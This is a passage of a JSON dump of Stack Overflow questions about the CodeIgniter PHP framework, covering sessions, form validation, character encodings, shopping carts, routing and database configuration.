on</p>\n\n<pre><code>/index.php/news/\n</code></pre>\n\n<p>As I say, this is right from the tutorial, so I'm not sure what's up.</p>\n\n<p>I can make the HREFs absolute....</p>\n\n<pre><code>&lt;p&gt;&lt;a href=\"&lt;?php echo config_item('base_url').config_item('index_page').'/news/'.$news_item['slug']; ?&gt;\"&gt;View article&lt;/a&gt;&lt;/p&gt;\n</code></pre>\n\n<p>...but figure I shouldn't have to.</p>\n\n<p>Any thoughts?</p>\n"},{"tags":["php","codeigniter","form-validation","utf-16","utf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12998644,"title":"codeigniter, converting to utf 16 charset, form validation wrong length","body":"<p>hey guys was hoping you could help me out.</p>\n\n<p>I am required to make a website coded in php+codeigniter to work with utf 16 charset.</p>\n\n<p>So to convert it,</p>\n\n<p>I have converted the database.php settings to:</p>\n\n<pre><code>$db['default']['char_set'] = 'utf16';\n$db['default']['dbcollat'] = 'utf16_unicode_ci';\n</code></pre>\n\n<p>I have made the config.php settings to:</p>\n\n<pre><code>$config['charset'] = 'UTF-16';\n</code></pre>\n\n<p>That seemed to solve the problem that was caused when outputing data, however I now have a new problem.</p>\n\n<p>My form validation checks have started failing, particular the length one.</p>\n\n<p>i.e when debugging I found that it was taking admin@admin.com as length 7 with the mb_strlen function.</p>\n\n<p><em><strong>note that it was working properly before the charset change! problem started after charset change.</em></strong></p>\n\n<hr>\n\n<p>update: turns out if you do mb_strlen($str,'utf-8') i get the correct answer, meaning that I am getting utf-8 encoded strings from the form.</p>\n\n<hr>\n\n<p>changing the min_length function from </p>\n\n<pre><code>public function min_length($str, $val)\n    {\n        if (preg_match(\"/[^0-9]/\", $val))\n        {\n\n            return FALSE;\n        }\n\n        if (function_exists('mb_strlen'))\n        {\n\n            return (mb_strlen($str) &lt; $val) ? FALSE : TRUE;\n        }\n\n        return (strlen($str) &lt; $val) ? FALSE : TRUE;\n    }\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>public function min_length($str, $val)\n    {\n        if (preg_match(\"/[^0-9]/\", $val))\n        {\n\n            return FALSE;\n        }\n\n        if (function_exists('mb_strlen'))\n        {\n            echo $str,\"&lt;br/&gt;\";\n            echo mb_strlen($str),\"&lt;br/&gt;\";\n            echo $val;die();\n            return (mb_strlen($str) &lt; $val) ? FALSE : TRUE;\n        }\n\n        return (strlen($str) &lt; $val) ? FALSE : TRUE;\n    }\n</code></pre>\n\n<p>I get the following output:</p>\n\n<pre><code>admin@admin.com\n7\n8\n</code></pre>\n\n<p>i.e it is taking admin@admin.com as length 7!</p>\n"},{"tags":["php","codeigniter","php4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1529,"score":0,"question_id":8497052,"title":"Codeigniter Call to a member function set_userdata() on a non-object","body":"<p>I am getting a fatal error in a CI app that I just moved from a php4 shared host to a php5 shared host.  </p>\n\n<pre><code>Fatal error: Call to a member function set_userdata() on a non-object in /home/chuck_ravenna/bob.ravennainteractive.com/system/application/helpers/authenticate_helper.php on line 13\n</code></pre>\n\n<p><em>Code in full located in the link below</em></p>\n\n<p><a href=\"https://gist.github.com/1474173\" rel=\"nofollow\">https://gist.github.com/1474173</a></p>\n\n<p>I am trying to figure out if the php version could be the issue.  The site runs fine on the old server, and the new server doesn't have php4 as an option.  </p>\n\n<p>The specific code line thats breaking is: </p>\n\n<pre><code>    $this-&gt;session-&gt;set_userdata(\"admin\", $user[0][\"admin\"]);\n</code></pre>\n"},{"tags":["php","codeigniter","database-connection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":150,"score":0,"question_id":8530942,"title":"what is the type of the database object instantiated by codeigniter?","body":"<p>I'm fairly new to CodeIgniter, and am trying to figure out something I feel should be easy that isn't.</p>\n\n<p>My application does a bit with Product objects, which at the momenet I'm just doing via the ActiveRecord features included within CodeIgniter's Database class. I normally prefer ORM over ActiveRecord, so as to properly separate business logic from database logic. In this case though, the objects that use Products generally handle all the business logic themselves, so I think the separation is still valid.</p>\n\n<p>My Product objects interact with the database through a <code>store()</code> method which I'd like to have accept a database connection as a parameter. The <code>store()</code> method first queries the database to determine if the product in question already exists in some form. If so, the product is updated with new information, and if not the product is inserted. Easy stuff. The problem is, I want to use type hinting for the <code>store()</code> method parameter, so that I can be sure that no objects incapable of basic CodeIgniter database/ActiveRecord functions are passed in to the method without the appropriate error being raised. </p>\n\n<p>For the life of me, I can't figure out the type of the CodeIgniter database class. After reading through the source code a bit, I thought for a while that the CI_DB_driver class was the one. However, when I use this as a type hint, my IDE (NetBeans 7.01, to be exact) doesn't recognize or give me any code completion options for ActiveRecord functions like <code>insert()</code> or <code>get_where()</code>. I don't think my IDE is at fault in this, in that it does recognize methods like <code>query()</code> or <code>insertString()</code>. </p>\n\n<p>I could use the standard CodeIgniter way of accessing/connecting to databases, i.e. using the internal CodeIgniter object's load method to instantiate a database object, but I was kind of hoping to insert or update Products as part of a somewhat bastardized Unit of Work pattern. I don't need to use transactions, since Product objects do not depend on the successful insertion, or update of any other Product objects (nor do the classes using Product objects). However, I don't want to create a brand new connection for every single Product object to be inserted or updated, nor do I want to tie things up with a persistent database connection. I'd rather just do something more akin to the following:</p>\n\n<pre><code>// catalog class is just an example\nclass Catalog extends CI_Model\n{\n    public function updateCatalog(array &amp;$products, $dbconn = null) {\n        if ($dbconn === null) {\n            try {\n                $dbconn = $this-&gt;load-&gt;database('default', true);\n            } catch (SQLException $e) {\n                show_error($e-&gt;getMessage);\n            }\n            $close_db = true;\n        }\n        foreach ($products as $product) {\n            try {              \n                // use the same db connection for all product storage tasks\n                $product-&gt;store($dbconn);\n            } catch (SQLException $e) {\n                show_error($e-&gt;getMessage);\n            }\n        }\n        if ($close_db) {\n            $dbconn-&gt;close(); // free up database connection for other tasks\n        }\n    }\n...\n</code></pre>\n\n<p>This is a very basic example. If another method needed to call the above method, it would instantiate the database connection object itself, and pass it in. I'm aiming for one database connection per overall request, ideally.</p>\n\n<p>Has anyone delved deeply enough into the CodeIgniter source code to know what I should use as a type hint for database objects? Is what I'm doing a bad approach to use with CodeIgniter? Would it be better to override the CodeIgniter functionality with a means of implementing connection pooling? </p>\n"},{"tags":["php","codeigniter","session","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":243,"score":0,"question_id":8544981,"title":"How can i set codeigniter sessions to globally accessible?","body":"<p>I am storing <code>userid</code> in session user data, but the user data only is available in one controller. I want to make the CodeIgniter sessions globally accessible.</p>\n\n<p>i have this code </p>\n\n<pre><code>$custom_data = array(\n            'userid'    =&gt;  $user_id,\n            'loggedin'  =&gt;  TRUE\n);\n\n$this-&gt;session-&gt;set_userdata($custom_data);\n</code></pre>\n\n<p>I just loaded session library, and I have also used some hacks after searching around, but nothing is working the way I would like. How can I tackle this properly?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":434,"score":1,"question_id":8136898,"title":"Extending Multiple models in Codeigniter 2","body":"<p>How do you set up CI2 to allow extending of multiple models?</p>\n\n<p>I can only get it to extend one model (put in /application/core) named <strong>MY_Model</strong> (case sensitive).</p>\n\n<p>To choose what model to extend I am doing;\nin the model..</p>\n\n<pre><code>require_once APPPATH.'core/MY_Another_model.php';\nclass Test_model extends MY_Another_model {\n...\n}\n</code></pre>\n\n<p>I can't find where in the core system code where it states only to allow models that are being extended to be called MY_Model.</p>\n\n<p>Thank you for any and all help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":8162482,"title":"how to add an error message to my errror messages <ul> in php","body":"<p>I am using codeigniter. I generate a custom error message from the errors which I get from codeigniter form validation:</p>\n\n<pre><code>$this-&gt;message-&gt;set_error ( $this-&gt;form_validation-&gt;error_array () );\n$message = $this-&gt;message-&gt;get_message ();\necho \"&lt;pre&gt;\"; print_r($message); die;\n$this-&gt;data ['message'] = $message;\n</code></pre>\n\n<p>the  <code>$message</code> is this </p>\n\n<pre><code>&lt;div class=\"errormsg message\"&gt;\n&lt;p&gt;\n&lt;em&gt;Error&lt;/em&gt;\n&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;The First Name field is required.&lt;/li&gt;\n&lt;li&gt;The Last Name field is required.&lt;/li&gt;\n&lt;li&gt;The Date of birth field is required.&lt;/li&gt;\n&lt;li&gt;The Email address field is required.&lt;/li&gt;\n&lt;li&gt;The Password field is required.&lt;/li&gt;\n&lt;li&gt;The Password Confirmation field is required.&lt;/li&gt;\n&lt;li&gt;The City field is required.&lt;/li&gt;\n&lt;li&gt;The State field is required.&lt;/li&gt;\n&lt;li&gt;The captureCode field is required.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>i have another error string </p>\n\n<pre><code>$err = 'Age is below 14';\n</code></pre>\n\n<p>I want to add this <code>$err</code> to the <code>&lt;ul&gt;</code>\nso the resulting <code>&lt;ul&gt;</code> will be </p>\n\n<pre><code>&lt;ul&gt;\n&lt;li&gt;The First Name field is required.&lt;/li&gt;\n&lt;li&gt;The Last Name field is required.&lt;/li&gt;\n&lt;li&gt;The Date of birth field is required.&lt;/li&gt;\n&lt;li&gt;The Email address field is required.&lt;/li&gt;\n&lt;li&gt;The Password field is required.&lt;/li&gt;\n&lt;li&gt;The Password Confirmation field is required.&lt;/li&gt;\n&lt;li&gt;The City field is required.&lt;/li&gt;\n&lt;li&gt;The State field is required.&lt;/li&gt;\n&lt;li&gt;The captureCode field is required.&lt;/li&gt;\n&lt;li&gt;Age is below 14&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>What is the best way to do this?</p>\n"},{"tags":["php","codeigniter","url-routing"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":9044910,"title":"controller name contain more then two capital letter not working in codeigniter","body":"<p>i have built application using codeigniter,<br>\nmy controller name is <code>userReg</code>, in controller i declared class like this,  </p>\n\n<pre><code>class UserReg extends CI_Controller { }  \n</code></pre>\n\n<p>when i link this controller i used, <code>&lt;a href=\"&lt;?php echo base_url();?&gt;userReg\"&gt;Register&lt;/a&gt;</code><br>\nit works fine in localhost, but when i put online, it's generate page not found error,<br>\ni have tried also <code>&lt;a href=\"&lt;?php echo base_url();?&gt;userreg\"&gt;Register&lt;/a&gt;</code>, but doesn't work.<br>\nso is there any solution?</p>\n"}]}
{"total":13987,"page":7,"pagesize":100,"questions":[{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":466,"score":1,"question_id":9047205,"title":"How to manually load a controller from another one in CodeIgniter?","body":"<p>I'm working with a controller name <code>page.php</code>. This is what I have:</p>\n\n<pre><code>class Page extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    public function index() {\n        show_404();\n    }\n\n    public function view($id) {\n        $query = $this-&gt;db-&gt;query(\"\n            SELECT * FROM proposals\n            WHERE id='$id'\");\n\n        if ($query-&gt;num_rows() == 1) {\n            $row = $query-&gt;row();\n            $data['proposal_id']          = $id;\n            $data['proposal_title']       = $row-&gt;title;\n            $data['proposal_proposer']    = $row-&gt;proposer;\n            $data['proposal_summary']     = $row-&gt;summary;\n            $data['proposal_description'] = $row-&gt;description;\n            $data['proposal_date']        = $row-&gt;date;\n            $data['proposal_vote']        = $row-&gt;vote;\n            $data['proposal_source']      = $row-&gt;source;\n            $query-&gt;free_result();   \n        } else {\n            show_404();\n        }\n\n        // Get user data\n        $user_info['logged_in'] = \"\";\n        $user_info['username']  = \"\";\n        $user_info['user_id']   = \"\";\n        $user_info['score']     = \"\";\n\n        // Get special variables needed for the header\n        $header_data['page_title']       = htmlspecialchars($data['proposal_title']);\n        $header_data['page_description'] = htmlspecialchars($data['proposal_summary']);\n\n        // Get special variables needed for the footer\n        $footer_data['stats_proposals'] = \"12\";\n        $footer_data['stats_users']     = \"42\";\n\n        // Check if this is an edit\n\n\n        // Load the views (interfaces) in order\n        $this-&gt;load-&gt;view('templates/header', $header_data);\n        $this-&gt;load-&gt;view('page',             $data);\n        $this-&gt;load-&gt;view('templates/footer', $footer_data);\n    }\n}\n</code></pre>\n\n<p>As shown above, I am manually calling the header using <code>$this-&gt;load-&gt;view('templates/header', $header_data);</code> and passing some info to it. However, in my case, this info will always be the same across the site. There a way for me to call some sort of controller BEFORE loading the view for the header?</p>\n"},{"tags":["php","codeigniter","session-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":9050315,"title":"How to manage sessions and users with CodeIgniter?","body":"<p>I'm in the middle of moving my site into the CodeIgniter framework. I've never used a MVC framework before so this is a big step.</p>\n\n<p>In my old site, each page would have <code>include(\"session_handler.php\");</code> at the top of each page. This script would check session variables, authenticate sessions and store stuff in the database.</p>\n\n<p>Is there a way I can have this script automatically include in every page? Can I specify it in the config? Does CI maybe have an internal way of dealing with sessions that is superior to my method?</p>\n"},{"tags":["php","codeigniter","activerecord","stored-procedures"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":286,"score":1,"question_id":8928751,"title":"Stored Procedures using CodeIgniter","body":"<p>Can you please advice on how to execute a stored procedure using the CodeIgniter Framework? I looked into the User Guide and was only able to find ways to access the DB using queries or ActiveRecords. Appreciate if someone could assist at the earliest.</p>\n"},{"tags":["php","mysql","codeigniter","caching"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":96,"score":4,"question_id":9051683,"title":"What is the best way to retrieve data from a model that is required on every page in CodeIgniter?","body":"<p>When a user is logged into my CodeIgniter application, I need a list of profiles that they have to be in the menu on every page they visit. Rather than call the model function on every single method in my application like so:</p>\n\n<pre><code>if ($this-&gt;users_model-&gt;is_logged_in())\n{\n    $data-&gt;profiles = $this-&gt;profiles_model-&gt;get_profiles();\n}\n\n$this-&gt;load-&gt;vars($data);\n</code></pre>\n\n<p>Is there a better way to do this? I considered the option of extending the CI_Controller class like this also but could not determine how best to pass the variable onto the actual method that will need the information.</p>\n\n<pre><code>class MY_Controller extends CI_Controller\n{\n    public function __construct()\n    {\n        // Alternatively these could be auto-loaded\n        $this-&gt;load-&gt;model(array('profiles_model', 'users_model'));\n\n        if ($this-&gt;users_model-&gt;is_logged_in())\n        {\n            $data-&gt;profiles = $this-&gt;profiles_model-&gt;get_profiles();\n        }\n    }\n}\n</code></pre>\n\n<p>My concern lies with best practice, best performance and best ability to cache (if this is even possible).</p>\n"},{"tags":["php","oop","codeigniter","design-patterns"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":148,"score":2,"question_id":9054480,"title":"How can I make my PHP application more object-oriented?","body":"<p>I have been developing PHP web applications for a few years. I almost always use an MVC pattern (usually with CodeIgniter), but I feel like most of the time I am just using classes to structure my code rather than really using objects. </p>\n\n<p>I have yet to see a need to implement any traditional design patterns (Factory, Command, Decorator, etc.). Is this just the nature of CI? or MVC? or Web applications? or PHP?</p>\n\n<p>Is there a way (or a need) to implement any of these patterns in a CI application? Do other frameworks make that more feasible? Or, is it just unnecessary for MVC applications? </p>\n"},{"tags":["php","codeigniter","utf-16"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12997814,"title":"how to output ucs2_unicode data with php","body":"<p>I am stuck on a project that requires foreign language characters.\nI need to input these and store them in the database as well as output them from the database to the screen.</p>\n\n<p>For example, I have this string <code>Kupon obuhvaća:</code> that shows as <code>Kupon obuhvaÄ‡a:</code> when I output it. </p>\n\n<p>Do you have any idea? </p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12997471,"title":"Use another database for sessions in CodeIgniter 2.1.3","body":"<p>/application/config/database.php</p>\n\n<pre><code>$active_group = 'default';\n$active_record = TRUE;\n\n$db['default']['hostname'] = 'localhost';\n$db['default']['username'] = 'root';\n$db['default']['password'] = '';\n$db['default']['database'] = 'example_blogs';\n$db['default']['dbdriver'] = 'mysql';\n$db['default']['dbprefix'] = 'o7j43c_';\n$db['default']['pconnect'] = TRUE;\n$db['default']['db_debug'] = TRUE;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE;\n\n$db['general']['hostname'] = 'localhost';\n$db['general']['username'] = 'root';\n$db['general']['password'] = '';\n$db['general']['database'] = 'example_main';\n$db['general']['dbdriver'] = 'mysql';\n$db['general']['dbprefix'] = 'u07u7b_';\n$db['general']['pconnect'] = TRUE;\n$db['general']['db_debug'] = TRUE;\n$db['general']['cache_on'] = FALSE;\n$db['general']['cachedir'] = '';\n$db['general']['char_set'] = 'utf8';\n$db['general']['dbcollat'] = 'utf8_general_ci';\n$db['general']['swap_pre'] = '';\n$db['general']['autoinit'] = TRUE;\n$db['general']['stricton'] = FALSE;\n</code></pre>\n\n<p>/system/libraries/Session.php</p>\n\n<p>Line 84</p>\n\n<pre><code>// Are we using a database?  If so, load it\nif ($this-&gt;sess_use_database === TRUE AND $this-&gt;sess_table_name != '')\n{\n    $this-&gt;CI-&gt;load-&gt;database();\n}\n</code></pre>\n\n<p>I change $this->CI->load->database(); to</p>\n\n<p>$this->CI->load->database('general', TRUE);</p>\n\n<p>But script use \"default\" db prefix (o7j43c_) instead \"general\" (u07u7b_).</p>\n\n<p>How can i designate \"general\" prefix for sessions?</p>\n"},{"tags":["codeigniter","sms"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":487,"score":1,"question_id":9658715,"title":"Sending SMS via PHP Codeigniter and email-to-SMS gateway","body":"<p>I am trying to send a text message via the following in PHP Codeigniter. </p>\n\n<p>If I send an email to the same \"##########@vtext.com\" from my gmail client, I receive the text message. </p>\n\n<p>If I use the same code below but substitute my gmail account, I receive the message via email. </p>\n\n<p>However, I cannot seem to trigger a text message sent to me via the code below. </p>\n\n<p>I am thinking it may have something to do with a spam filter somewhere within the phone service. </p>\n\n<p>Any suggestions, or else a free workaround for sending SMS via PHP/Codeigniter? Thanks!</p>\n\n<pre><code>public function textMe()\n    {\n        $this-&gt;load-&gt;library('email'); \n        $this-&gt;email-&gt;to('##########@vtext.com'); [number edited out]\n        $this-&gt;email-&gt;from('Notify@test.org','Test'); \n        $this-&gt;email-&gt;subject(\"Test Subject\"); \n        $this-&gt;email-&gt;message('Test Message'); \n        $this-&gt;email-&gt;send(); \n        echo $this-&gt;email-&gt;print_debugger();\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","autoload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12996881,"title":"Codeigniter - An Error Was Encountered - Unable to load the requested class: encrypt","body":"<p>I have inherited a CI v2.0.2 project.</p>\n\n<p>For development purposes, the project was moved to another subdomain, and the <code>database.php</code> file has been properly reconfigured.</p>\n\n<p>The login page loads fine. However, after trying to login, I get an error from CI saying:</p>\n\n<pre><code>An Error Was Encountered \nUnable to load the requested class: encrypt\n</code></pre>\n\n<p>In <code>autoload.php</code>, the <code>database</code> and <code>session</code> libraries are autoloaded. This file is the same as in the main codebase.</p>\n\n<p>If I add the <code>encrypt</code> library in the above line, I’m unable to see the login page at all.</p>\n\n<p>Below is the log file, from loading the login page - </p>\n\n<pre><code>DEBUG - 2012-10-21 04:15:22 --&gt; Config Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Hooks Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Utf8 Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; UTF-8 Support Enabled\nDEBUG - 2012-10-21 04:15:22 --&gt; URI Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Router Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Output Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Security Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Input Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; XSS Filtering completed\nDEBUG - 2012-10-21 04:15:22 --&gt; XSS Filtering completed\nDEBUG - 2012-10-21 04:15:22 --&gt; XSS Filtering completed\nDEBUG - 2012-10-21 04:15:22 --&gt; Global POST and COOKIE data sanitized\nDEBUG - 2012-10-21 04:15:22 --&gt; Language Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Loader Class Initialized\nDEBUG - 2012-10-21 04:15:22 --&gt; Helper loaded: url_helper\nDEBUG - 2012-10-21 04:15:22 --&gt; Database Driver Class Initialized\nDEBUG - 2012-10-21 04:15:23 --&gt; Session Class Initialized\nDEBUG - 2012-10-21 04:15:23 --&gt; Helper loaded: string_helper\nDEBUG - 2012-10-21 04:15:23 --&gt; Session routines successfully run\nDEBUG - 2012-10-21 04:15:23 --&gt; Controller Class Initialized\nERROR - 2012-10-21 04:15:23 --&gt; Unable to load the requested class: encrypt\n</code></pre>\n\n<p>The login works fine when used from the original domain.</p>\n\n<p>Any pointers where I should begin looking?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":381,"score":0,"question_id":7380846,"title":"Shopping Cart not working properly in codeigniter","body":"<p>I’m trying to add items to the shopping cart but it will only add the first 6 items to the cart. The rest don’t seem to get added.</p>\n\n<p>I’ve checked the arrays and they have the required id, qty, price, and name. What am I doing wrong?</p>\n\n<p>Here is the code:  </p>\n\n<pre><code>function add_cart_item() {\n\n    $id = $this-&gt;input-&gt;post('product_id'); // Assign posted product_id to $id\n    $cty = $this-&gt;input-&gt;post('quantity'); // Assign posted quantity to $cty\n    $colors = $this-&gt;input-&gt;post('color_id'); // Assign posted color to $colors\n    $sizes = $this-&gt;input-&gt;post('size_id'); // Assign posted size to $sizes\n\n    $warna = \"warna\";\n    $ukuran = \"ukuran\";\n\n    //Ini untuk warna\n    $sqlNameColor = 'SELECT NAME FROM ref_colors WHERE ID = \"'.$colors.'\"';\n    $queryNameColor = $this-&gt;db-&gt;query($sqlNameColor);\n    $color_id = $queryNameColor-&gt;row()-&gt;NAME;\n\n    //Ini untuk ukuran\n    $sqlNameSize = 'SELECT NAME FROM ref_sizes WHERE ID = \"'.$sizes.'\"';\n    $queryNameSize = $this-&gt;db-&gt;query($sqlNameSize);\n    $size_id = $queryNameSize-&gt;row()-&gt;NAME;\n\n    //Ini untuk weight\n    $sqlWeight = 'SELECT WEIGHT FROM v_weight WHERE PRODUCT_ID = \"'.$id.'\"';\n    $queryWeight = $this-&gt;db-&gt;query($sqlWeight);\n    $weight = $queryWeight-&gt;row()-&gt;WEIGHT;\n\n    $product = $this-&gt;model_product-&gt;get($id);\n\n\n    $data = array(\n                'id'      =&gt; $id,\n                'qty'     =&gt; $cty,\n                'price'   =&gt; $product-&gt;PRICE,\n                'name'    =&gt; $product-&gt;NAME,\n        'colors'  =&gt; $color_id, \n        'sizes'   =&gt; $size_id,\n        'colors_id' =&gt; $colors,\n        'weight' =&gt; $weight,\n        'size_id' =&gt; $this-&gt;input-&gt;post('size_id'),\n        'image'   =&gt; $product-&gt;IMAGE,\n        'options'=&gt;array('Size' =&gt; $this-&gt;input-&gt;post('size_id'), 'Color' =&gt; $this-&gt;input-&gt;post('color_id'))\n\n\n            );\n\n            $this-&gt;cart-&gt;insert($data);\n    $data['cart_list'] = $this-&gt;cart-&gt;contents(); \n    show_shoppingcart('shoppingcart_view', $data);\n\n}\n</code></pre>\n\n<p>The problem is when i add option value in my cart.</p>\n\n<p>Here is the arrays result:</p>\n\n<pre><code>Array (\n[698d51a19d8a121ce581499d7b701668] =&gt; Array\n    (\n        [rowid] =&gt; 698d51a19d8a121ce581499d7b701668\n        [id] =&gt; 1\n        [qty] =&gt; 1\n        [price] =&gt; 10000\n        [name] =&gt; Nike superfly Merah\n        [colors] =&gt; MERAH\n        [sizes] =&gt; 34\n        [colors_id] =&gt; 1\n        [weight] =&gt; \n        [size_id] =&gt; 1\n        [image] =&gt; assets/images/product/SB 02 - 03 Nike superfly3 merah.jpg\n        [options] =&gt; Array\n            (\n                [Size] =&gt; 1\n                [Color] =&gt; 1\n            )\n\n        [subtotal] =&gt; 10000\n    )\n\n[caf1a3dfb505ffed0d024130f58c5cfa] =&gt; Array\n    (\n        [rowid] =&gt; caf1a3dfb505ffed0d024130f58c5cfa\n        [id] =&gt; 3\n        [qty] =&gt; 1\n        [price] =&gt; 30000\n        [name] =&gt; Nike Superfly ungu\n        [colors] =&gt; MERAH\n        [sizes] =&gt; 35\n        [colors_id] =&gt; 1\n        [weight] =&gt; \n        [size_id] =&gt; 2\n        [image] =&gt; assets/images/product/thumbs/T SB 02 - 02 nike superfly3 ijo Stabilo 3.jpg\n        [options] =&gt; Array\n            (\n                [Size] =&gt; 2\n                [Color] =&gt; 1\n            )\n\n        [subtotal] =&gt; 30000\n    )\n\n[f85454e8279be180185cac7d243c5eb3] =&gt; Array\n    (\n        [rowid] =&gt; f85454e8279be180185cac7d243c5eb3\n        [id] =&gt; 4\n        [qty] =&gt; 1\n        [price] =&gt; 20000\n        [name] =&gt; Nike Superfly Ijo stabilo\n        [colors] =&gt; PUTIH\n        [sizes] =&gt; 35\n        [colors_id] =&gt; 2\n        [weight] =&gt; \n        [size_id] =&gt; 2\n        [image] =&gt; assets/images/product/thumbs/t SBI 001 03 - Nike CTR putih lis Merah 2.jpg\n        [options] =&gt; Array\n            (\n                [Size] =&gt; 2\n                [Color] =&gt; 2\n            )\n\n        [subtotal] =&gt; 20000\n    )\n\n[c8ed21db4f678f3b13b9d5ee16489088] =&gt; Array\n    (\n        [rowid] =&gt; c8ed21db4f678f3b13b9d5ee16489088\n        [id] =&gt; 7\n        [qty] =&gt; 1\n        [price] =&gt; 12000\n        [name] =&gt; NIKE CTR Fabregas Kw Super PUTIH KOM \n        [colors] =&gt; PUTIH\n        [sizes] =&gt; 35\n        [colors_id] =&gt; 2\n        [weight] =&gt; \n        [size_id] =&gt; 2\n        [image] =&gt; assets/images/product/thumbs/T SB 02 04 - Nike superfly3 ungu3 - Copy.jpg\n        [options] =&gt; Array\n            (\n                [Size] =&gt; 2\n                [Color] =&gt; 2\n            )\n\n        [subtotal] =&gt; 12000\n    )\n\n[ccc0aa1b81bf81e16c676ddb977c5881] =&gt; Array\n    (\n        [rowid] =&gt; ccc0aa1b81bf81e16c676ddb977c5881\n        [id] =&gt; 9\n        [qty] =&gt; 1\n        [price] =&gt; 12000\n        [name] =&gt; ADIDAS CTR Fabregas Kw Super PUTIH KOM BIRU\n        [colors] =&gt; PUTIH\n        [sizes] =&gt; 35\n        [colors_id] =&gt; 2\n        [weight] =&gt; \n        [size_id] =&gt; 2\n        [image] =&gt; assets/images/product/thumbs/T SBI 001 01 - Nike CTR putih lis Biru 2.jpg\n        [options] =&gt; Array\n            (\n                [Size] =&gt; 2\n                [Color] =&gt; 2\n            )\n\n        [subtotal] =&gt; 12000\n    )\n</code></pre>\n\n<p>)</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2887,"score":5,"question_id":5226261,"title":"CodeIgniter Active Record not equal","body":"<p>In CodeIgniter using active record, how do I perform a not equal too.  For instance:</p>\n\n<pre><code>$this-&gt;db-&gt;where('emailsToCampaigns.campaignId', $campaignId);\n</code></pre>\n\n<p>Will do equal too, but I need not equal too.  I have tried:</p>\n\n<pre><code>$this-&gt;db-&gt;where('emailsToCampaigns.campaignId &lt;&gt; ', $campaignId);\n$this-&gt;db-&gt;where('emailsToCampaigns.campaignId != ', $campaignId);\n$this-&gt;db-&gt;where('emailsToCampaigns.campaignId', ' != ' . $campaignId);\n$this-&gt;db-&gt;where('emailsToCampaigns.campaignId != ' . $campaignId);\n</code></pre>\n\n<p>All with no luck.  Ideas?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":71,"score":0,"question_id":12996851,"title":"Insert data from array_push to database in codeigniter","body":"<p>Hi i hava data in array like this :</p>\n\n<pre><code>$data = Array\n       (\n[0] =&gt; Array\n    (\n        [kode_pbt] =&gt; PBT3-2012-10-19\n        [kodebr] =&gt; 8992802618731\n        [harga] =&gt; 25905.00\n        [jml] =&gt; 1\n        [subtotal_harga] =&gt; 25905\n    )\n\n[1] =&gt; Array\n    (\n        [kode_pbt] =&gt; PBT3-2012-10-19\n        [kodebr] =&gt; 8992388112401\n        [harga] =&gt; 1340.00\n        [jml] =&gt; 1\n        [subtotal_harga] =&gt; 1340\n    )\n\n  )\n</code></pre>\n\n<p>my problem is when i want to insert to database \nwhite this code : $this->db->insert($table, $data)\ni got an error:\nMessage: Array to string conversion\nI have changed to $this->db->insert_batch($table, $data), but i got error '500 internal server error'.\nThank for your assist.</p>\n\n<p>This is my full function code in controller :</p>\n\n<pre><code>function save_pbt($kode = -1) {\n    $pbt_detail = array();\n    $pbt_data = array(\n        'kode_pbt' =&gt; trim($this-&gt;input-&gt;post('kode_pbt')),\n        'unit_pemakai' =&gt; trim($this-&gt;input-&gt;post('unit_pemakai')),\n        'jml_item' =&gt; trim($this-&gt;input-&gt;post('jml_item')),\n        'total_harga' =&gt; trim($this-&gt;input-&gt;post('total_harga')),\n        'tgl_pbt' =&gt; date('Y-m-d'),\n        'status' 